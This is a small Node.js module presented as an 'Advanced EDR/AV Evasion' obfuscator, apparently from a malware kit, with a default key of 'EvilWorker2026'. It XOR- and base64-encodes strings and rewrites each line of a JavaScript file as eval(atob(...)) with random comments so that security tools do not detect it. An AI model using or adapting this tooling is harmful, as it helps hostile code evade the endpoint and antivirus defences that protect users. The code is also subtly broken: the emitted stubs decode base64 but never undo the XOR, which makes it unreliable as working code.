// obfuscator.js - Advanced EDR/AV Evasion
const crypto = require('crypto');

function obfuscateString(str, key = 'EvilWorker2026') {
    let result = '';
    for (let i = 0; i < str.length; i++) {
        result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return Buffer.from(result).toString('base64');
}

function deobfuscateString(encoded, key = 'EvilWorker2026') {
    const str = Buffer.from(encoded, 'base64').toString('utf-8');
    let result = '';
    for (let i = 0; i < str.length; i++) {
        result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

function generateObfuscationKey() {
    return crypto.randomBytes(16).toString('hex');
}

function obfuscateJSFile(filePath, key) {
    const fs = require('fs');
    const code = fs.readFileSync(filePath, 'utf-8');
    const lines = code.split('\n');
    const obfuscated = lines.map(line => {
        if (line.trim() === '') return '';
        const randomComment = `/* ${crypto.randomBytes(4).toString('hex')} */`;
        const encoded = obfuscateString(line, key);
        return `${randomComment} eval(atob('${encoded}'));`;
    }).join('\n');
    return obfuscated;
}

module.exports = { obfuscateString, deobfuscateString, generateObfuscationKey, obfuscateJSFile };
